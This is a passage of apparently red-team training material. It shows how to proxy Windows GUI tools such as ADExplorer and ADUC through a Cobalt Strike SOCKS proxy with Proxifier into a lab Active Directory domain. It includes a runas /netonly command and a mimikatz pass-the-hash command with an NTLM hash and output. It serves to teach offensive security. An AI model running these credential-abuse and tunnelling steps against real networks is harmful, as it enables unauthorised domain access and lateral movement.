We can tunnel GUI apps that run on Windows using a proxy client such as [Proxifier](https://www.proxifier.com/).

Open **Proxifier**, go to **Profile > Proxy Servers** and **Add** a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/proxy-servers.png)

  

Next, go to **Profile > Proxification Rules**. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for **adexplorer64.exe** (part of the Sysinternals Suite). When this application tries to connect to a target host within the **10.10.17.0/24** subnet (**dev.cyberbotic.io**), it will be automatically proxied through the Cobalt Strike proxy server defined above.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/proxy-rule.png)

  

Now launch ADExplorer and connect to **10.10.17.71** (DC-2).

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/ad-connect.png)

  

You will then see the traffic being proxied in Proxifier, and ADExplorer connects successfully.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/adexplorer.png)

  

Some applications (such as the RSAT tools) don't provide a means of providing a username or password, because they're designed to use a user's domain context. You can still run these tools on your attacking machine. If you have the clear text credentials, use `runas /netonly`.

```
C:\>runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
Enter the password for DEV\nlamb:
Attempting to start C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc as user "DEV\nlamb" ...
```

  

If you have an NTLM hash, use `sekurlsa::pth`.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:nlamb /domain:dev.cyberbotic.io /ntlm:2e8a408a8aec852ef2e458b938b8c071 /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
user    : nlamb
domain  : dev.cyberbotic.io
program : C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc
impers. : no
NTLM    : 2e8a408a8aec852ef2e458b938b8c071
  |  PID  13608
  |  TID  23228
  |  LSA Process is now R/W
  |  LUID 0 ; 3731125840 (00000000:de647650)
  \_ msv1_0   - data copy @ 000002B378344C10 : OK !
  \_ kerberos - data copy @ 000002B37859B388
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000002B378209E28 (32) -> null
```

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/aduc.png)

  

  > You will also need to add a static host entry in your `C:\Windows\System32\drivers\etc\hosts` file: `10.10.17.71 dev.cyberbotic.io`. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.